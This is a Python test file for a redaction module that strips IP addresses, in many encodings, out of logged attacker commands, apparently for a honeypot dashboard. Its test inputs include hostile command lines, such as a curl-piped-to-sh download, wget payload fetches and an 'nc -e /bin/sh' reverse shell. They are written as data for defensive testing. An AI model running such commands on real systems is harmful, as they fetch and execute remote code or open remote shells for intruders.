"""IP redaction for attacker free text (mirror of the frontend redactIps tests)."""

import re
import time

from src.services.redact import IP_BLOT, redact_ips, safe_host

_DOTTED_QUAD = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")


def test_redacts_ipv4_in_command() -> None:
    assert redact_ips("wget http://34.11.136.102/meow") == "wget http://<ip>/meow"


def test_redacts_https_ipv4_with_port() -> None:
    out = redact_ips("curl https://185.220.101.5:8080/x.sh | sh")
    assert out == "curl https://<ip>:8080/x.sh | sh"
    assert not _DOTTED_QUAD.search(out)


def test_redacts_ipv6_forms() -> None:
    assert redact_ips("ping 2001:db8::1").count("<ip>") == 1
    assert "2001:db8" not in redact_ips("wget https://[2001:db8::1]/x")
    # Embedded-v4, bracketed and unbracketed: no dotted-quad tail survives.
    assert not _DOTTED_QUAD.search(redact_ips("route 2001:db8::1.2.3.4 via"))
    assert not _DOTTED_QUAD.search(redact_ips("wget https://2001:db8::1.2.3.4/p"))


def test_redacts_alternate_encoded_hosts() -> None:
    assert redact_ips("wget http://2130706433/bin") == "wget http://<ip>/bin"
    assert redact_ips("curl http://0x7f000001/a") == "curl http://<ip>/a"
    assert redact_ips("wget http://0177.0.0.1/x") == "wget http://<ip>/x"


def test_does_not_touch_domains_or_version_strings() -> None:
    assert (
        redact_ips("wget https://example.com/clean") == "wget https://example.com/clean"
    )
    assert redact_ips("lib.so.1.2.3.4.5") == "lib.so.1.2.3.4.5"
    assert redact_ips("chmod 777 x; 13:41:49") == "chmod 777 x; 13:41:49"


def test_redacts_schemeless_numeric_hosts() -> None:
    assert redact_ips("nc -e /bin/sh 2130706433 4444") == "nc -e /bin/sh <ip> 4444"
    assert redact_ips("nc 0x7f000001 4444") == "nc <ip> 4444"
    assert redact_ips("curl ftp://2130706433/x") == "curl ftp://<ip>/x"


def test_does_not_touch_ordinary_shell_numbers() -> None:
    for s in ["chmod 777 x", "sleep 30", "dd bs=1024", "id=12345"]:
        assert redact_ips(s) == s
    # 10-digit but above the valid IPv4-as-integer range (> 4294967295): not an IP.
    assert redact_ips("echo 9999999999") == "echo 9999999999"


def test_idempotent_and_none_passthrough() -> None:
    once = redact_ips("get http://1.2.3.4/x")
    assert redact_ips(once) == once  # already blotted -> unchanged
    assert redact_ips(None) is None
    assert IP_BLOT == "<ip>"


def test_blots_an_ip_wrapped_in_underscores() -> None:
    """Word boundary \\b does not fire against `_`, so underscores need explicit
    handling."""
    assert redact_ips("MGLNDD_204.168.164.170_22") == "MGLNDD_<ip>_22"


def test_underscore_widening_does_not_over_blot() -> None:
    """Widening the boundary must not start eating version-like strings."""
    assert redact_ips("lib.so.1.2.3.4.5") == "lib.so.1.2.3.4.5"
    assert redact_ips("abc1.2.3.4") == "abc1.2.3.4"
    assert redact_ips("1.2.3.4abc") == "1.2.3.4abc"
    assert redact_ips("SSH-2.0-libssh_0.9.6") == "SSH-2.0-libssh_0.9.6"
    # Still blotted: a real address with a filename suffix.
    assert redact_ips("1.2.3.4.arm7") == "<ip>.arm7"


def test_numeric_hosts_off_keeps_ordinary_numbers() -> None:
    """Without numeric_hosts, large integers are kept as passwords to avoid corrupting
    leaderboards."""
    assert redact_ips("123456789", numeric_hosts=False) == "123456789"
    assert redact_ips("Admin@123456789", numeric_hosts=False) == "Admin@123456789"
    # Real literals are still blotted with the flag off.
    assert redact_ips("204.168.164.170", numeric_hosts=False) == "<ip>"
    assert redact_ips("connect 2001:db8::1", numeric_hosts=False) == "connect <ip>"
    assert redact_ips("nc -e /bin/sh 2130706433 4444") == "nc -e /bin/sh <ip> 4444"


def test_safe_host_drops_every_address_encoding() -> None:
    """`host`/`network` promise "never an IP", so anything address-shaped is None."""
    for bad in [
        "1.2.3.4",
        "1.2.3.4.",
        "0x7f000001",
        "2130706433",
        "192.168.001.1",
        "0177.0.0.1",
        "0.0.0.1",
        "185.220.101.5.nip.io",  # wildcard DNS wrapping an address
        "2001:db8::1",
    ]:
        assert safe_host(bad) is None, f"{bad!r} survived safe_host"


def test_safe_host_keeps_real_names_and_as_orgs() -> None:
    """The relay `network` column is usually an AS org name, not a hostname."""
    for good in ["cdn.example.com", "ip-who.com", "Cloudflare, Inc.", "YANDEX LLC"]:
        assert safe_host(good) == good
    assert safe_host(None) is None
    assert safe_host("") is None


def test_redacts_ip_flanked_by_control_chars() -> None:
    """A control char immediately before/after the digit run does not confuse the
    boundary guards; only the digits themselves are alnum-checked."""
    assert redact_ips("\x1b1.2.3.4\x07") == "\x1b<ip>\x07"
    assert redact_ips("\x00wget http://1.2.3.4/x\x00") == "\x00wget http://<ip>/x\x00"


def test_ansi_sgr_terminator_blocks_the_alnum_boundary() -> None:
    """Documents redact_ips's own regex in isolation, not a live end-to-end gap:
    the IPv4 guard rejects any alnum immediately before the digits (so it does
    not eat version strings like lib.so.1.2.3.4.5). An ANSI color code ends in
    a letter (`m`), so `\\x1b[31m` immediately followed by an IP is
    indistinguishable from that case and the IP is left un-blotted here.

    Not reachable through the real pipeline: ingestor's `truncate()` strips
    whole CSI escape sequences before storage, closing this gap upstream
    (see sanitize.py's `_ANSI_ESCAPE`, proven end-to-end by
    test_write_command_strips_ansi_so_embedded_ip_stays_redactable in
    ingestor/tests/test_writer.py)."""
    assert redact_ips("\x1b[31m1.2.3.4\x1b[0m") == "\x1b[31m1.2.3.4\x1b[0m"
    # A separator between the escape code and the IP restores normal blotting.
    assert redact_ips("\x1b[31m 1.2.3.4\x1b[0m") == "\x1b[31m <ip>\x1b[0m"


def test_control_chars_alone_pass_through_unchanged() -> None:
    """No IP-shaped text present: control chars are not this module's concern
    (contrast ingestor's sanitize()/truncate(), which own control-char
    stripping/escaping for their own log/storage sinks) and are left untouched."""
    assert redact_ips("\x1b") == "\x1b"
    assert redact_ips("\x07\x07\x07") == "\x07\x07\x07"
    assert redact_ips("\x00") == "\x00"
    assert redact_ips("\x00\x00\x00") == "\x00\x00\x00"


def test_crlf_passes_through_around_a_blotted_ip() -> None:
    """CR/LF is a log-forgery vector elsewhere, but redact_ips's only job is IP
    blotting: line-ending bytes around the blot are left exactly as typed."""
    assert redact_ips("get 1.2.3.4\r\ndone") == "get <ip>\r\ndone"


def test_nul_byte_survives_ip_blotting() -> None:
    """NUL bytes are not stripped by redact_ips (Postgres-storage NUL-stripping
    is truncate()'s job in the ingestor, not this client-facing module's)."""
    assert redact_ips("wget http://1.2.3.4/x\x00.sh") == "wget http://<ip>/x\x00.sh"
    assert redact_ips("MGLNDD_204.168.164.170_22\x00") == "MGLNDD_<ip>_22\x00"


def test_safe_host_ignores_control_chars_absent_an_ip_shape() -> None:
    """safe_host only screens for address encodings; a stray control char in an
    otherwise-real name is not itself an address, so it is not blanked."""
    assert safe_host("exam\x00ple.com") == "exam\x00ple.com"
    assert safe_host("cdn\x1b[31m.example.com") == "cdn\x1b[31m.example.com"


def test_safe_host_still_blanks_an_ip_with_a_trailing_nul() -> None:
    assert safe_host("1.2.3.4\x00") is None


def test_numeric_host_pattern_does_not_backtrack_on_adversarial_input() -> None:
    """Attacker text is redacted inline, so the numeric-host pattern must stay linear.

    "9." followed by many "00." repetitions used to hit exponential backtracking
    (a 69-char string already cost ~0.6s), which made any command or credential
    field a denial-of-service lever.
    """
    payload = "9." + "00." * 400 + "!"
    start = time.perf_counter()
    redact_ips(payload)
    assert time.perf_counter() - start < 1.0
